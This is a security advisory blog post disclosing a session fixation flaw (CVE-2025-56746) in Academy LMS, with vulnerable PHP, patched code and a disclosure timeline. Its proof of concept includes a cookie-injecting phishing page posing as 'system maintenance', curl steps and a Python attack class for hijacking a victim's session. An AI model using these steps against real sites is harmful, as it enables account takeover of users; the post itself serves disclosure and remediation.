---
title: "Session Fixation Vulnerability in Academy LMS Authentication"
date: 2025-07-20
tags: ["security", "session-fixation", "academy-lms", "authentication"]
categories: ["Security Research"]
draft: false
url: "/academy-lms-session-fixation-1t8v5n3q6h/"
_build:
  list: false
  render: true
  publishResources: true
sitemap:
  disable: true
---

## Overview

A session fixation vulnerability has been identified in Academy LMS versions up to and including 5.13, where the system fails to regenerate session IDs after successful authentication, allowing attackers to hijack user sessions.

## Technical Details

**CVE ID:** [CVE-2025-56746](https://nvd.nist.gov/vuln/detail/CVE-2025-56746)  
**CVSS Score:** 2.3 (Low)  
**Affected Versions:** Academy LMS ≤ v5.13  
**Vulnerability Type:** Session Fixation  

### Affected Components
- File: `lms/application/controllers/Login.php:80,117`

### Affected Endpoint
- `POST /lms/login/validate_login`

### Vulnerability Description

Academy LMS does not regenerate session identifiers after successful user authentication. This allows attackers to perform session fixation attacks by setting a known session ID before the victim logs in, then using that same session ID to access the victim's authenticated session.

### Vulnerable Source Code

```php
// From lms/application/controllers/Login.php:80-90 (partial)
if ($query->num_rows() > 0 && $ver_pss == "sukses") {
    $this->session->unset_userdata('blocking');
    $this->session->unset_userdata('waktu_blocking');
    $this->session->unset_userdata("percobaan");

    $row = $query->row();
    // ... OTP verification process ...
    
    // Missing: session_regenerate_id(true);
    $this->user_model->set_login_userdata($row->id);
}

// From lms/application/controllers/Login.php:117-118 (partial)
$row = $query->row();
$this->user_model->new_device_login_tracker($row->id);
$this->user_model->set_login_userdata($row->id);
// Missing: session_regenerate_id(true); - Session ID remains unchanged!
```

## Impact

An attacker can:
1. **Set a predetermined session ID** for a victim user
2. **Trick the user into logging in** with the fixed session ID
3. **Access the victim's authenticated session** using the known session ID
4. **Perform unauthorized actions** on behalf of the victim
5. **Access sensitive user data** and administrative functions

## Session Fixation Attack Flow

### 1. Session ID Remains Unchanged
The vulnerability exists because the session ID remains the same before and after authentication:

```
Before Login:  ci_session = abc123def456
After Login:   ci_session = abc123def456  (Same ID!)
```

### 2. Attack Prerequisites
- Attacker must be able to set session cookies for the victim
- Victim must log in while using the attacker-controlled session

## Proof of Concept

### Basic Session Fixation Attack

#### Step 1: Attacker Sets Session ID
```javascript
// Attacker visits the login page and gets a session ID
fetch('https://target.com/lms/login')
  .then(response => {
    // Extract session ID from Set-Cookie header
    const sessionId = extractSessionId(response.headers.get('set-cookie'));
    console.log('Fixed Session ID:', sessionId);
    // sessionId = "abc123def456"
  });
```

#### Step 2: Attacker Tricks Victim
```html
<!-- Attacker sends victim a link with fixed session -->
<a href="https://target.com/lms/login;jsessionid=abc123def456">
  Login to Academy LMS
</a>

<!-- Or injects session via XSS (if available) -->
<script>
document.cookie = "ci_session=abc123def456; domain=target.com; path=/";
</script>
```

#### Step 3: Victim Logs In
```bash
# Victim logs in with the fixed session ID
curl -X POST "https://target.com/lms/login/validate_login" \
  -H "Cookie: ci_session=abc123def456" \
  -d "email=victim@example.com&password=victimpassword"

# Response shows successful login but same session ID
# Set-Cookie: ci_session=abc123def456 (unchanged!)
```

#### Step 4: Attacker Accesses Session
```bash
# Attacker uses the same session ID to access victim's account
curl "https://target.com/lms/user/dashboard" \
  -H "Cookie: ci_session=abc123def456"

# Successfully accesses victim's authenticated session
```

### Advanced Attack Scenarios

#### Scenario 1: Social Engineering
```html
<!-- Attacker creates malicious page -->
<!DOCTYPE html>
<html>
<head>
    <title>Academy LMS System Maintenance</title>
</head>
<body>
    <script>
    // Set fixed session ID
    document.cookie = "ci_session=attacker_controlled_id; domain=target.com; path=/";
    
    // Redirect to real login page
    setTimeout(() => {
        window.location.href = "https://target.com/lms/login";
    }, 1000);
    </script>
    
    <p>Redirecting to login page...</p>
</body>
</html>
```

#### Scenario 2: Public Computer Attack
```bash
# Attacker uses public computer to set session
curl "https://target.com/lms/login" \
  -c cookies.txt

# Extract session ID
SESSION_ID=$(grep ci_session cookies.txt | cut -f7)

# Leave computer with predetermined session
# Victim logs in later with the same session
# Attacker returns and uses the session
```

#### Scenario 3: Network-Based Attack
```python
import requests
from urllib.parse import urljoin

class SessionFixationAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def get_session_id(self):
        """Get a session ID from the target"""
        response = self.session.get(urljoin(self.target_url, '/lms/login'))
        return self.session.cookies.get('ci_session')
    
    def create_malicious_link(self, session_id):
        """Create malicious link with fixed session"""
        return f"{self.target_url}/lms/login;jsessionid={session_id}"
    
    def check_session_access(self, session_id):
        """Check if session provides authenticated access"""
        cookies = {'ci_session': session_id}
        response = requests.get(
            urljoin(self.target_url, '/lms/user/dashboard'),
            cookies=cookies
        )
        return 'logout' in response.text.lower()

# Usage
attack = SessionFixationAttack('https://target.com')
fixed_session = attack.get_session_id()
malicious_link = attack.create_malicious_link(fixed_session)

print(f"Send victim this link: {malicious_link}")
print(f"Then use session ID: {fixed_session}")
```

## Technical Analysis

### Current Vulnerable Code
```php
// In Login.php controller - vulnerable implementation
public function validate_login() {
    $email = $this->input->post('email');
    $password = $this->input->post('password');
    
    // Validate credentials
    $user_data = $this->user_model->authenticate($email, $password);
    
    if ($user_data) {
        // Set session data but DON'T regenerate session ID
        $this->session->set_userdata([
            'user_id' => $user_data['id'],
            'email' => $user_data['email'],
            'logged_in' => true
        ]);
        
        // Redirect to dashboard
        redirect('user/dashboard');
    }
    
    // Session ID remains the same! (VULNERABLE)
}
```

### Session Tracking Evidence
Session ID comparison before and after login:

```bash
# Before login
curl -c before.txt "https://target.com/lms/login"
grep ci_session before.txt
# ci_session: abc123def456

# After login  
curl -b before.txt -c after.txt -X POST "https://target.com/lms/login/validate_login" \
  -d "email=test@example.com&password=password"
grep ci_session after.txt
# ci_session: abc123def456 (SAME ID - VULNERABLE!)
```

## Mitigation

### Immediate Fix
Implement session regeneration after successful authentication:

```php
// Secure implementation in Login.php
public function validate_login() {
    $email = $this->input->post('email');
    $password = $this->input->post('password');
    
    // Validate credentials
    $user_data = $this->user_model->authenticate($email, $password);
    
    if ($user_data) {
        // IMPORTANT: Regenerate session ID after successful login
        session_regenerate_id(true);  // true = delete old session
        
        // Set session data with new session ID
        $this->session->set_userdata([
            'user_id' => $user_data['id'],
            'email' => $user_data['email'],
            'logged_in' => true
        ]);
        
        // Optional: Set session regeneration timestamp
        $this->session->set_userdata('last_regeneration', time());
        
        redirect('user/dashboard');
    }
}
```

### CodeIgniter-Specific Implementation
```php
// Using CodeIgniter's session library
public function validate_login() {
    // ... authentication logic ...
    
    if ($user_data) {
        // Regenerate session ID
        $this->session->sess_regenerate(true);
        
        // Set authenticated session data
        $session_data = [
            'user_id' => $user_data['id'],
            'email' => $user_data['email'],
            'role' => $user_data['role'],
            'logged_in' => true,
            'login_time' => time()
        ];
        
        $this->session->set_userdata($session_data);
        
        // Redirect to appropriate dashboard
        redirect('user/dashboard');
    }
}
```

### Additional Security Measures

#### 1. Session Security Configuration
```php
// In config/config.php
$config['sess_expiration'] = 7200;  // 2 hours
$config['sess_time_to_update'] = 300;  // Regenerate every 5 minutes
$config['sess_regenerate_destroy'] = true;  // Destroy old session data
$config['sess_cookie_secure'] = true;  // HTTPS only
$config['sess_cookie_httponly'] = true;  // No JavaScript access
```

#### 2. Regular Session Regeneration
```php
// Regenerate session periodically during active use
public function __construct() {
    parent::__construct();
    
    if ($this->session->userdata('logged_in')) {
        $last_regeneration = $this->session->userdata('last_regeneration');
        
        // Regenerate every 30 minutes
        if (!$last_regeneration || (time() - $last_regeneration) > 1800) {
            session_regenerate_id(true);
            $this->session->set_userdata('last_regeneration', time());
        }
    }
}
```

#### 3. Session Validation
```php
// Validate session integrity
public function validate_session() {
    $user_id = $this->session->userdata('user_id');
    $session_id = session_id();
    
    // Check if session exists in database
    $valid_session = $this->session_model->validate_session($user_id, $session_id);
    
    if (!$valid_session) {
        $this->session->sess_destroy();
        redirect('login');
    }
}
```

## Prevention Best Practices

1. **Always regenerate session IDs** after authentication state changes
2. **Implement session timeout** and regular regeneration
3. **Use secure session configuration** (HttpOnly, Secure flags)
4. **Validate session integrity** on each request
5. **Implement logout functionality** that destroys sessions
6. **Monitor for suspicious session activity**

## Timeline

- **Discovery:** July 2025 (During white box penetration testing)
- **Vendor Notification:** July 20, 2025 (Responsible disclosure to Creativeitem/Academy LMS team)
- **CVE Request Submitted:** July 20, 2025 (CVE number requested from MITRE)
- **Vendor Response:** Awaiting response from vendor
- **Public Disclosure:** July 20, 2025

*This vulnerability was discovered during a white box penetration test. Given that Academy LMS is a widely-used commercial template with many installations across different organizations, we decided to report this as a responsible disclosure to help protect all users of this platform.*

*This timeline will be updated accordingly as the responsible disclosure process progresses.*

## References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [CodeIgniter Session Library Documentation](https://codeigniter.com/userguide3/libraries/sessions.html)

## Credit

This vulnerability was discovered and responsibly disclosed by the security research team at suryadina.com.

---
*This post is part of our ongoing security research into popular Learning Management Systems. For more security insights, visit [https://suryadina.com](https://suryadina.com).*
